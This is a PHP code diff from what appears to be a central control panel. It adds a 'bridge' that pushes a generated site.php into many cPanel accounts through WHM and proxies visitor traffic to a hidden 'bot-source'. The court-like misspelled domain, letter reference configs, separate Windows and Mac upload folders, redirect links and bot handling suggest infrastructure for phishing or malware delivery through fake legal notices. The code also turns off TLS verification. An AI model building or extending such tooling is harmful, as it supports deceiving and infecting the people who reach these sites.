@@ -897,6 +897,43 @@ try {
             $sub    = preg_replace('/[^a-z0-9_]/', '', (string)($input['subaction'] ?? $_POST['subaction'] ?? ''));
             if (!$cu || !$sub) { json_out(['ok' => false, 'error' => 'Missing cpanelUser or subaction']); break; }
 
+            // Detect bridge mode: sites/{domain}/bot-config.json exists locally on panelcou1999
+            $bridge_site_cfg_path = '/home/panelcou1999/public_html/sites/' . $domain . '/bot-config.json';
+            $is_bridge = file_exists($bridge_site_cfg_path);
+
+            if ($is_bridge) {
+                // Bridge mode: call proxy.php locally (in-process, no HTTP round-trip)
+                // proxy.php reads from sites/{domain}/, runs bot-api.php bot source
+                $bridge_cfg = json_decode(file_get_contents($bridge_site_cfg_path), true) ?: [];
+                $bridge_key = $bridge_cfg['bridge_key'] ?? '';
+                if (!$bridge_key) {
+                    json_out(['ok' => false, 'error' => 'Bridge key missing. Run Deploy Bridge first.']);
+                    break;
+                }
+                // Build a fake $_POST for proxy.php
+                $_POST['_site']   = $domain;
+                $_POST['_secret'] = $bridge_key;
+                $_POST['_script'] = 'bot-api.php';
+                $_POST['_ip']     = $CONFIG['whm']['host']; // internal call from panelcou1999
+                $_POST['_ua']     = 'HostPanel-Dashboard/1.0';
+                $_POST['_host']   = 'panel.courtfidral-services.online';
+                $_POST['_proto']  = 'https';
+                // Merge sub-action params
+                $fwd = $input;
+                unset($fwd['cpanelUser'], $fwd['domain'], $fwd['subaction']);
+                $fwd['action'] = $sub;
+                foreach ($fwd as $k => $v) $_POST['p_' . $k] = $v;
+                // Also handle $_FILES passthrough for uploads
+                ob_start();
+                include '/home/panelcou1999/public_html/proxy.php';
+                $out = ob_get_clean();
+                $resp = json_decode($out, true);
+                if ($resp === null) { json_out(['ok' => false, 'error' => 'Bad JSON from bridge proxy', 'raw' => substr($out, 0, 500)]); break; }
+                json_out($resp);
+                break;
+            }
+
+            // Classic mode: bot-api.php deployed on cPanel
             // Fetch panel_api_key from bot-config.json on the target cPanel (via WHM)
             $bc_r   = whm_cpanel_uapi($cu, 'Fileman', 'get_file_content',
                 ['dir' => '/public_html', 'file' => 'bot-config.json']);
@@ -995,6 +1032,118 @@ try {
             $resp = json_decode($raw, true);
             if ($resp === null) { json_out(['ok' => false, 'error' => 'Bad JSON from bot-api']); break; }
             json_out($resp);
+
+        // Deploy bridge: creates sites/{domain}/ data dir on panelcou1999 +
+        // uploads site.php (single bridge file) to the target cPanel.
+        // After this, all bot traffic flows: visitor → cPanel/site.php → proxy.php → bot-source
+        case 'deploy_bridge':
+            require_auth();
+            set_time_limit(120);
+            $cu     = preg_replace('/[^a-z0-9_]/i', '', (string)($input['cpanelUser'] ?? ''));
+            $domain = strtolower(preg_replace('/[^a-z0-9.\-]/i', '', (string)($input['domain'] ?? '')));
+            if (!$cu || !$domain) { json_out(['ok' => false, 'error' => 'Missing cpanelUser or domain']); break; }
+
+            // ── 1. Generate / retrieve bridge_key ──────────────────────────────────────
+            $site_cfg_dir  = '/home/panelcou1999/public_html/sites/' . $domain;
+            $site_cfg_file = $site_cfg_dir . '/bot-config.json';
+
+            // Read existing config if present (migration: preserve tokens, settings, etc.)
+            $existing_cfg = [];
+            if (file_exists($site_cfg_file)) {
+                $existing_cfg = json_decode(file_get_contents($site_cfg_file), true) ?: [];
+            } else {
+                // Also check cPanel's old bot-config.json for migration
+                $old_bc = whm_cpanel_uapi($cu, 'Fileman', 'get_file_content',
+                    ['dir' => '/public_html', 'file' => 'bot-config.json']);
+                if ($old_bc['status'] ?? 0) {
+                    $existing_cfg = json_decode($old_bc['data']['content'] ?? '{}', true) ?: [];
+                    // Strip old cPanel-only keys
+                    unset($existing_cfg['panel_api_key']);
+                }
+            }
+
+            $bridge_key = $existing_cfg['bridge_key'] ?? bin2hex(random_bytes(24));
+            $existing_cfg['bridge_key'] = $bridge_key;
+            if (empty($existing_cfg['site_url']))     $existing_cfg['site_url']     = 'https://' . $domain;
+            if (empty($existing_cfg['redirect_link'])) $existing_cfg['redirect_link'] = 'https://' . $domain;
+
+            // ── 2. Create site data directory on panelcou1999 ─────────────────────────
+            foreach ([
+                $site_cfg_dir,
+                $site_cfg_dir . '/uploads',
+                $site_cfg_dir . '/uploads/windows',
+                $site_cfg_dir . '/uploads/mac',
+                $site_cfg_dir . '/sessions',
+            ] as $dir) {
+                if (!is_dir($dir)) @mkdir($dir, 0755, true);
+            }
+
+            // Write bot-config.json into sites/{domain}/
+            file_put_contents($site_cfg_file, json_encode($existing_cfg, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+
+            // Write letter-config.json if not present
+            $lc_file = $site_cfg_dir . '/letter-config.json';
+            if (!file_exists($lc_file)) {
+                file_put_contents($lc_file, json_encode(['ref_prefix' => 'REF'], JSON_PRETTY_PRINT));
+            }
+
+            // Write .htaccess into sites/{domain}/ so uploads are not directly accessible
+            $htaccess_file = $site_cfg_dir . '/.htaccess';
+            if (!file_exists($htaccess_file)) {
+                file_put_contents($htaccess_file, "Options -Indexes\nDeny from all\n");
+            }
+
+            // ── 3. Build site.php with bridge_key + site_id baked in ─────────────────
+            $site_php_src = file_get_contents('/home/panelcou1999/public_html/bot-source/site.php');
+            if (!$site_php_src) {
+                json_out(['ok' => false, 'error' => 'site.php not found in bot-source. Upload it first.']);
+                break;
+            }
+            $site_php_final = str_replace(
+                ['__SITE_ID__', '__BRIDGE_KEY__'],
+                [$domain,       $bridge_key],
+                $site_php_src
+            );
+
+            // ── 4. Upload site.php to cPanel public_html ─────────────────────────────
+            // Use WHM Fileman API2 savefile (known to work)
+            $w = $CONFIG['whm'];
+            $savefile_body = http_build_query([
+                'cpanel_jsonapi_user'    => $cu,
+                'cpanel_jsonapi_module'  => 'Fileman',
+                'cpanel_jsonapi_func'    => 'savefile',
+                'cpanel_jsonapi_version' => '2',
+                'filename'               => '/public_html/site.php',
+                'content'                => $site_php_final,
+            ]);
+            $save_ctx = stream_context_create(['http' => [
+                'method'  => 'POST',
+                'header'  => "Authorization: whm {$w['user']}:{$w['token']}\r\nContent-Type: application/x-www-form-urlencoded\r\n",
+                'content' => $savefile_body,
+                'timeout' => 30,
+            ], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
+            $save_raw  = @file_get_contents("https://{$w['host']}:2086/execute/Fileman/save_file_content", false, $save_ctx);
+            $save_resp = json_decode($save_raw ?? '{}', true) ?: [];
+
+            // Fallback: try the WHM UAPI v3 path
+            if (!($save_resp['status'] ?? 0)) {
+                $r2 = whm_cpanel_uapi($cu, 'Fileman', 'save_file_content',
+                    ['dir' => '/public_html', 'file' => 'site.php', 'content' => $site_php_final]);
+                if (!($r2['status'] ?? 0)) {
+                    json_out(['ok' => false, 'error' => 'Could not write site.php to cPanel: ' .
+                        ($r2['errors'][0] ?? $save_resp['errors'][0] ?? 'unknown')]);
+                    break;
+                }
+            }
+
+            json_out([
+                'ok'          => true,
+                'msg'         => 'Bridge deployed',
+                'site_dir'    => $site_cfg_dir,
+                'bridge_key'  => $bridge_key,
+                'site_id'     => $domain,
+                'note'        => 'Visitor traffic: ' . $domain . '/site.php → proxy.php → bot-source',
+            ]);
 
         default:
             json_out(['ok' => false, 'error' => 'unknown action'], 404);
